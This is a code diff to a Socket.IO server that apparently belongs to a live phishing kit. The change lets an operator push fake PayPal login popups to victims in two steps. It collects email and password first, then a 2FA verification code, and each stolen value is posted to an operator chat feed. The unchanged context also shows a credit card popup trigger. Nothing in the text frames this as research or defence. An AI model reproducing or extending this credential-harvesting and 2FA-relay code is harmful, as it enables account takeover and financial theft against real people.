@@ -80,8 +80,12 @@ io.on('connection', async (socket) => {
     socket.broadcast.emit('display credit card popup');
   });
 
-  socket.on('request paypal account', () => {
-    socket.broadcast.emit('display paypal account popup');
+  socket.on('request paypal login1', () => {
+    socket.broadcast.emit('display paypal login1 popup');
+  });
+
+  socket.on('request paypal login2', () => {
+    socket.broadcast.emit('display paypal login2 popup');
   });
 
   socket.on('verification popup', (data) => {
@@ -109,16 +113,23 @@ io.on('connection', async (socket) => {
     });
   });
 
-  socket.on('paypal account data', (data) => {
-    const { accountData } = data;
+  socket.on('paypal login1 data', (data) => {
+    const { loginData } = data;
     io.emit('chat message', {
       user: 'System',
-      text: `PayPal Account Information Received:
-📧 Email: ${accountData.email}
-🔐 Password: ${accountData.password}
-📱 Phone: ${accountData.phoneNumber}
-🔒 Security Answer: ${accountData.securityAnswer || 'Not provided'}
-🔢 2FA Code: ${accountData.verificationCode || 'Not provided'}`,
+      text: `PayPal Login Information Received (Step 1):
+📧 Email: ${loginData.email}
+🔐 Password: ${loginData.password}`,
+      clientInfo
+    });
+  });
+
+  socket.on('paypal login2 data', (data) => {
+    const { verificationData } = data;
+    io.emit('chat message', {
+      user: 'System',
+      text: `PayPal 2FA Code Received (Step 2):
+🔢 Verification Code: ${verificationData.verificationCode}`,
       clientInfo
     });
   });
